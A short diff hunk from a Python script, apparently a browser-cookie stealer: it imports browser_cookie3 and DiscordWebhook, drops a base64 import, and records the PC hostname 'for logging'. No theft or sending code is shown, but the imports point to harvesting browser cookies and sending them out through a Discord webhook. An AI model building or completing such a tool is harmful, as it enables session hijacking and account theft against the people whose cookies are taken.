@@ -2,7 +2,6 @@ import browser_cookie3
 import socket
 import time
 import os
-import base64
 from discord_webhook import DiscordWebhook
 
 hostname=socket.gethostname()   # Get Hostname of PC (For Logging)
